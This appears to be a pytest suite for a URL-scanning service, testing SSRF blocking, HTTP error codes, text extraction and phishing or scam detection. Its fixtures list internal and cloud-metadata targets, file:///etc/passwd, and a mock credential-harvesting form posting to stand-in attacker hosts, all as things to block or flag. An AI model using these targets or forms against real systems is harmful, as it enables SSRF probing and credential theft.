"""
SOR SENTINEL — URL Analysis Robustness, SSRF Prevention, and Error Handling Tests
"""
from unittest.mock import AsyncMock, MagicMock, patch
from contextlib import asynccontextmanager

import httpx
import pytest

from app.services.url_service import (
    fetch_url_content,
    validate_url,
    _extract_text_from_html,
)


# Helper async generator for streaming responses
async def mock_bytes_stream(chunks: list[bytes]):
    for c in chunks:
        yield c


def _create_mock_stream_response(
    status_code: int = 200,
    headers: dict | None = None,
    content_chunks: list[bytes] | None = None,
    is_redirect: bool = False,
    encoding: str = "utf-8",
):
    if headers is None:
        headers = {"content-type": "text/html; charset=utf-8"}
    if content_chunks is None:
        content_chunks = [b"<html><body><article><p>Some valid text content</p></article></body></html>"]

    mock_resp = MagicMock()
    mock_resp.status_code = status_code
    mock_resp.headers = headers
    mock_resp.is_redirect = is_redirect
    mock_resp.encoding = encoding
    mock_resp.aiter_bytes = lambda chunk_size=8192: mock_bytes_stream(content_chunks)
    return mock_resp


# ── URL Validation & SSRF Tests ───────────────────────────────────────────────

def test_validate_url_invalid_schemes():
    """Ensure non-HTTP schemes are rejected."""
    for scheme in ["ftp://example.com/file", "file:///etc/passwd", "gopher://example.com", "javascript:alert(1)"]:
        valid, err = validate_url(scheme)
        assert not valid
        assert "http and https" in err.lower() or "invalid" in err.lower()


def test_validate_url_private_ips():
    """Ensure loopback, private, and cloud metadata IPs are rejected."""
    private_targets = [
        "http://127.0.0.1/admin",
        "http://127.0.0.5:8080",
        "http://10.0.0.1/secret",
        "http://192.168.1.1/router",
        "http://172.16.0.1/internal",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/status",
    ]
    for url in private_targets:
        valid, err = validate_url(url)
        assert not valid, f"Expected {url} to be blocked"
        assert "private" in err.lower() or "security" in err.lower() or "permitted" in err.lower()


def test_validate_url_blocked_hostnames():
    """Ensure sensitive internal hostnames are blocked."""
    for host in ["localhost", "metadata.google.internal", "instance-data", "metadata"]:
        valid, err = validate_url(f"http://{host}/api")
        assert not valid
        assert "not permitted" in err.lower() or "security" in err.lower() or "resolve" in err.lower()


# ── HTML Text Extraction Tests ────────────────────────────────────────────────

def test_extract_text_strips_scripts_and_styles():
    """Ensure scripts, styles, navs, and ads are stripped from HTML."""
    html = """
    <html>
      <head>
        <title>Breakthrough in Renewable Energy</title>
        <style>body { font-size: 14px; }</style>
        <script>console.log("tracker");</script>
      </head>
      <body>
        <nav><a href="/">Home</a><a href="/about">About</a></nav>
        <header>Header Banner</header>
        <article>
          <h1>Breakthrough in Renewable Energy</h1>
          <p>Engineers have developed a high-efficiency solid-state solar module that exceeds 35% conversion efficiency.</p>
          <p>The research was peer-reviewed and tested over 5,000 thermal cycles with zero degradation.</p>
        </article>
        <footer>Copyright 2026</footer>
      </body>
    </html>
    """
    text = _extract_text_from_html(html)
    assert "Breakthrough in Renewable Energy" in text
    assert "conversion efficiency" in text
    assert "tracker" not in text
    assert "font-size" not in text
    assert "Copyright 2026" not in text


# ── Status Code and Access Handling Tests ─────────────────────────────────────

@pytest.mark.asyncio
async def test_url_http_401_unauthorized():
    """Verify HTTP 401 returns URL_UNAUTHORIZED_401 with manual fallback guidance."""
    resp_401 = _create_mock_stream_response(status_code=401)

    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        yield resp_401

    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=mock_stream):
            text, err = await fetch_url_content("https://example.com/protected")

    assert text is None
    assert err is not None
    assert err["error_code"] == "URL_UNAUTHORIZED_401"
    assert "authentication" in err["error_message"].lower() or "401" in err["error_message"]
    assert "paste the page text manually" in err["error_message"]


@pytest.mark.asyncio
async def test_url_http_403_access_denied():
    """Verify HTTP 403 returns URL_ACCESS_DENIED_403 and manual fallback guidance."""
    resp_403 = _create_mock_stream_response(status_code=403)

    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        yield resp_403

    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=mock_stream):
            text, err = await fetch_url_content("https://example.com/blocked")

    assert text is None
    assert err is not None
    assert err["error_code"] == "URL_ACCESS_DENIED_403"
    assert "denied automated access (HTTP 403)" in err["error_message"]
    assert "paste the page text manually" in err["error_message"]


@pytest.mark.asyncio
async def test_url_http_404_not_found():
    """Verify HTTP 404 returns URL_NOT_FOUND_404."""
    resp_404 = _create_mock_stream_response(status_code=404)

    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        yield resp_404

    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=mock_stream):
            text, err = await fetch_url_content("https://example.com/missing")

    assert text is None
    assert err is not None
    assert err["error_code"] == "URL_NOT_FOUND_404"
    assert "404" in err["error_message"]


@pytest.mark.asyncio
async def test_url_http_429_rate_limit():
    """Verify HTTP 429 returns URL_RATE_LIMITED_429."""
    resp_429 = _create_mock_stream_response(status_code=429)

    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        yield resp_429

    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=mock_stream):
            text, err = await fetch_url_content("https://example.com/busy")

    assert text is None
    assert err is not None
    assert err["error_code"] == "URL_RATE_LIMITED_429"


@pytest.mark.asyncio
async def test_url_http_5xx_server_error():
    """Verify HTTP 500/503 returns URL_SERVER_ERROR_5XX."""
    resp_503 = _create_mock_stream_response(status_code=503)

    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        yield resp_503

    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=mock_stream):
            text, err = await fetch_url_content("https://example.com/error")

    assert text is None
    assert err is not None
    assert err["error_code"] == "URL_SERVER_ERROR_5XX"
    assert "503" in err["error_message"]


# ── Timeout and Network Error Tests ───────────────────────────────────────────

@pytest.mark.asyncio
async def test_url_connect_timeout():
    """Verify ConnectTimeout returns URL_CONNECT_TIMEOUT."""
    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=httpx.ConnectTimeout("Connection timed out")):
            text, err = await fetch_url_content("https://example.com/slow")

    assert text is None
    assert err is not None
    assert err["error_code"] == "URL_CONNECT_TIMEOUT"


@pytest.mark.asyncio
async def test_url_read_timeout():
    """Verify ReadTimeout returns URL_READ_TIMEOUT."""
    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=httpx.ReadTimeout("Read timed out")):
            text, err = await fetch_url_content("https://example.com/slow-read")

    assert text is None
    assert err is not None
    assert err["error_code"] == "URL_READ_TIMEOUT"


# ── Redirect SSRF Prevention Tests ────────────────────────────────────────────

@pytest.mark.asyncio
async def test_url_redirect_to_private_ip_is_blocked():
    """Verify redirect to a private IP (e.g. 192.168.1.1) is blocked before connection."""
    # First response: 302 redirecting to private IP
    resp_302 = _create_mock_stream_response(
        status_code=302,
        headers={"location": "http://192.168.1.100/admin"},
        is_redirect=True,
    )

    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        yield resp_302

    # Initial URL valid, but redirect hop to private IP fails SSRF check
    def mock_validate(u: str):
        if "192.168" in u:
            return False, "This URL resolves to a private or reserved IP address."
        return True, ""

    with patch("app.services.url_service.validate_url", side_effect=mock_validate):
        with patch("httpx.AsyncClient.stream", side_effect=mock_stream):
            text, err = await fetch_url_content("https://public-site.com/redirect")

    assert text is None
    assert err is not None
    assert err["error_code"] == "URL_REDIRECT_BLOCKED_SSRF"
    assert "private" in err["error_message"].lower() or "blocked" in err["error_message"].lower()


# ── Content Type & Content Length Tests ───────────────────────────────────────

@pytest.mark.asyncio
async def test_url_unsupported_content_type():
    """Verify non-HTML/text content types (like PDF or images) are rejected safely."""
    resp_pdf = _create_mock_stream_response(
        status_code=200,
        headers={"content-type": "application/pdf"},
    )

    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        yield resp_pdf

    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=mock_stream):
            text, err = await fetch_url_content("https://example.com/document.pdf")

    assert text is None
    assert err is not None
    assert err["error_code"] == "URL_UNSUPPORTED_CONTENT_TYPE"
    assert "unsupported content type" in err["error_message"].lower()


@pytest.mark.asyncio
async def test_url_insufficient_text_content():
    """Verify pages with insufficient readable text offer manual text fallback."""
    # HTML with only empty elements or scripts
    empty_html = b"<html><head><script>render();</script></head><body><div id='app'></div></body></html>"
    resp_empty = _create_mock_stream_response(
        status_code=200,
        headers={"content-type": "text/html; charset=utf-8"},
        content_chunks=[empty_html],
    )

    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        yield resp_empty

    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=mock_stream):
            text, err = await fetch_url_content("https://example.com/empty-spa")

    assert text is None
    assert err is not None
    assert err["error_code"] == "URL_INSUFFICIENT_TEXT"
    assert "paste the page text manually" in err["error_message"].lower()


@pytest.mark.asyncio
async def test_url_successful_extraction():
    """Verify readable HTML extracts sufficient text and returns success."""
    full_html = (
        b"<html><head><title>Quantum Computing Progress</title></head>"
        b"<body><article><p>" + (b"Scientific researchers have demonstrated fault-tolerant logical qubits in quantum silicon architectures. " * 3) + b"</p></article></body></html>"
    )
    resp_ok = _create_mock_stream_response(
        status_code=200,
        headers={"content-type": "text/html; charset=utf-8"},
        content_chunks=[full_html],
    )

    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        yield resp_ok

    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=mock_stream):
            text, err = await fetch_url_content("https://example.com/quantum-news")

    assert err is None
    assert text is not None
    assert "Quantum Computing Progress" in text
    assert "fault-tolerant logical qubits" in text


# ── Multi-Stage URL Scanner & Verdict Tests ───────────────────────────────────

def test_inspect_url_heuristics_detects_phishing():
    """Verify heuristics flag brand impersonation, high-abuse TLDs, and login paths."""
    from app.services.url_service import inspect_url_heuristics

    res = inspect_url_heuristics("https://paypal.com.verify-billing-update.xyz/login")
    assert res["brand_impersonation"] == "paypal"
    assert "login" in res["found_keywords"]
    assert res["risk_score"] >= 60


def test_inspect_url_heuristics_detects_shorteners():
    """Verify heuristics identify common URL shortening domains."""
    from app.services.url_service import inspect_url_heuristics

    for short_url in ["https://bit.ly/3XYZtest", "https://tinyurl.com/promo1", "https://t.co/abc"]:
        res = inspect_url_heuristics(short_url)
        assert res["is_shortener"] is True


def test_extract_html_signals_detects_credential_forms():
    """Verify HTML extractor detects password and OTP fields, and offsite form targets."""
    from app.services.url_service import extract_html_signals

    html = """
    <html>
      <head><title>Account Verification</title></head>
      <body>
        <form action="http://malicious-exfiltrator.com/post.php" method="POST">
          <input type="text" name="user_id" placeholder="Account User ID">
          <input type="password" name="password" placeholder="Account Password">
          <input type="text" name="otp_code" placeholder="Enter 6-digit OTP code">
          <button type="submit">Verify</button>
        </form>
      </body>
    </html>
    """
    signals = extract_html_signals(html, "https://secure-bank-login.com/login")
    assert signals["has_forms"] is True
    assert signals["has_password"] is True
    assert signals["has_otp"] is True
    assert len(signals["offsite_actions"]) > 0
    assert "malicious-exfiltrator.com" in signals["offsite_actions"][0]


def test_extract_html_signals_detects_promotional_scam():
    """Verify HTML extractor flags high-pressure giveaway and reward claims."""
    from app.services.url_service import extract_html_signals

    html = """
    <html>
      <head><title>Special Customer Promotion</title></head>
      <body>
        <h1>Congratulations! You have been selected as today's lucky winner!</h1>
        <p>Claim your prize now: 100% free $1,000 shopping gift card. Hurry, limited time only!</p>
      </body>
    </html>
    """
    signals = extract_html_signals(html, "https://free-rewards-promo.xyz/claim")
    assert len(signals["promotional_signals"]) >= 2
    assert any("congratulations" in s.lower() for s in signals["promotional_signals"])


@pytest.mark.asyncio
async def test_scan_url_comprehensive_redirect_chain():
    """Verify multi-hop redirects are tracked and returned in redirect_chain."""
    from app.services.url_service import scan_url_comprehensive

    # Hop 0 redirects to hop 1, hop 1 responds 200
    resp_302 = _create_mock_stream_response(
        status_code=302,
        headers={"location": "https://destination-site.com/article"},
        is_redirect=True,
    )
    resp_200 = _create_mock_stream_response(
        status_code=200,
        content_chunks=[b"<html><head><title>Final Article</title></head><body><article><p>" + (b"Comprehensive research text on sustainable systems. " * 5) + b"</p></article></body></html>"],
    )

    hop_count = 0
    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        nonlocal hop_count
        if hop_count == 0:
            hop_count += 1
            yield resp_302
        else:
            yield resp_200

    with patch("app.services.url_service.validate_url", return_value=(True, "")):
        with patch("httpx.AsyncClient.stream", side_effect=mock_stream):
            result = await scan_url_comprehensive("https://short.link/xyz")

    assert len(result["redirect_chain"]) >= 2
    assert result["final_url"] == "https://destination-site.com/article"
    assert result["status_code"] == 200
    assert "sustainable systems" in result["text_content"]


@pytest.mark.asyncio
async def test_scan_url_comprehensive_playwright_graceful_when_unavailable():
    """Verify Playwright fallback handles missing playwright gracefully without crashing."""
    from app.services.url_service import scan_url_comprehensive

    # Empty SPA shell
    spa_html = b"<html><head><title>SPA App</title></head><body><div id='root'></div><script src='app.js'></script></body></html>"
    resp_spa = _create_mock_stream_response(
        status_code=200,
        content_chunks=[spa_html],
    )

    @asynccontextmanager
    async def mock_stream(*args, **kwargs):
        yield resp_spa

    with patch("app.services.url_service.validate_url", return_value=(True, "")), \
         patch("httpx.AsyncClient.stream", side_effect=mock_stream), \
         patch("app.services.url_service._extract_with_playwright", return_value=(None, {"error": "Playwright not installed"})):
        result = await scan_url_comprehensive("https://spa-example.com/app")

    assert result["is_valid"] is True
    assert result["status_code"] == 200
    assert result["html_signals"]["is_spa"] is True


def test_synthesize_url_verdict_phishing():
    """Verify synthesize_url_verdict assigns 'Likely Phishing/Fraudulent' on credential harvesting."""
    from app.services.url_service import synthesize_url_verdict

    scan_result = {
        "initial_url": "https://paypal.com.verify-billing.xyz/login",
        "final_url": "https://paypal.com.verify-billing.xyz/login",
        "redirect_chain": [],
        "extraction_method": "static",
        "heuristics": {
            "hostname": "paypal.com.verify-billing.xyz",
            "brand_impersonation": "paypal",
            "risk_score": 75,
        },
        "html_signals": {
            "has_forms": True,
            "has_password": True,
            "has_otp": True,
            "offsite_actions": ["http://phish-drop.ru/log.php"],
        },
        "text_content": "Sign in to verify your PayPal account.",
        "error_dict": None,
    }

    verdict = synthesize_url_verdict(scan_result)
    assert verdict["overall_assessment"] == "Likely Phishing/Fraudulent"
    assert verdict["credibility_score"] <= 30
    assert verdict["sensitivity_level"] == "critical"
    assert any(f["category"] == "credential_harvesting" for f in verdict["findings"])


def test_synthesize_url_verdict_promotional():
    """Verify synthesize_url_verdict assigns 'Suspicious' on promotional scams."""
    from app.services.url_service import synthesize_url_verdict

    scan_result = {
        "initial_url": "https://free-gifts-center.xyz/claim",
        "final_url": "https://free-gifts-center.xyz/claim",
        "redirect_chain": [],
        "extraction_method": "static",
        "heuristics": {
            "hostname": "free-gifts-center.xyz",
            "brand_impersonation": None,
            "risk_score": 45,
        },
        "html_signals": {
            "has_forms": False,
            "promotional_signals": ["Congratulations", "Claim your prize"],
        },
        "text_content": "Congratulations! You have been selected to win a free gift card.",
        "error_dict": None,
    }

    verdict = synthesize_url_verdict(scan_result)
    assert verdict["overall_assessment"] == "Suspicious"
    assert verdict["credibility_score"] < 60
    assert any(f["category"] == "promotional_scam" for f in verdict["findings"])


def test_synthesize_url_verdict_unreachable():
    """Verify inaccessible URLs return 'Unavailable' instead of failing."""
    from app.services.url_service import synthesize_url_verdict

    scan_result = {
        "initial_url": "https://nonexistent-server-down.com/page",
        "final_url": "https://nonexistent-server-down.com/page",
        "redirect_chain": [],
        "extraction_method": "http_error",
        "heuristics": {"hostname": "nonexistent-server-down.com", "risk_score": 10},
        "html_signals": {},
        "text_content": "",
        "error_dict": {"error_code": "URL_CONNECT_TIMEOUT", "error_message": "Connection timed out."},
    }

    verdict = synthesize_url_verdict(scan_result)
    assert verdict["overall_assessment"] == "Unavailable"
    assert verdict["credibility_score"] == 50
    assert verdict["status"] == "completed"
    assert "UNAVAILABLE" in verdict["summary"]


def test_synthesize_url_verdict_inconclusive_bot_protection():
    """Verify 403 access-denied pages with clean domains return 'Inconclusive'."""
    from app.services.url_service import synthesize_url_verdict

    scan_result = {
        "initial_url": "https://protected-company-site.com/report",
        "final_url": "https://protected-company-site.com/report",
        "redirect_chain": [],
        "extraction_method": "http_error",
        "heuristics": {"hostname": "protected-company-site.com", "risk_score": 10},
        "html_signals": {},
        "text_content": "",
        "error_dict": {"error_code": "URL_ACCESS_DENIED_403", "error_message": "Access Denied (HTTP 403)."},
    }

    verdict = synthesize_url_verdict(scan_result)
    assert verdict["overall_assessment"] == "Inconclusive"
    assert verdict["credibility_score"] == 50
    assert "INCONCLUSIVE" in verdict["summary"]


def test_synthesize_url_verdict_legitimate():
    """Verify legitimate informative sites return 'Likely Legitimate'."""
    from app.services.url_service import synthesize_url_verdict

    scan_result = {
        "initial_url": "https://en.wikipedia.org/wiki/Computer_science",
        "final_url": "https://en.wikipedia.org/wiki/Computer_science",
        "redirect_chain": [{"hop": 0, "url": "https://en.wikipedia.org/wiki/Computer_science", "status_code": 200}],
        "extraction_method": "static",
        "heuristics": {"hostname": "en.wikipedia.org", "risk_score": 0},
        "html_signals": {
            "title": "Computer science - Wikipedia",
            "has_forms": False,
            "has_password": False,
            "promotional_signals": [],
        },
        "text_content": "Computer science is the study of computation, information, and automation. " * 10,
        "error_dict": None,
    }

    verdict = synthesize_url_verdict(scan_result)
    assert verdict["overall_assessment"] == "Likely Legitimate"
    assert verdict["credibility_score"] >= 80
